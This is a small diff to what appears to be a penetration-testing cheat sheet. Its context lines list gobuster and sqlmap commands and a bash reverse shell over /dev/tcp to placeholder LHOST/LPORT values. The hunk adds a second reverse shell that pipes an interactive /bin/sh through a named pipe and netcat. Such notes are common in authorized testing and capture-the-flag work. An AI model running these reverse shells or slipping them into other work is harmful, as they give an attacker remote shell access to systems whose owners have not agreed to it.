@@ -26,3 +26,4 @@ gobuster dir -w WORDLIST -u URL -o OUTFILE
 sqlmap -r REQFILE --batch
 
 bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/y
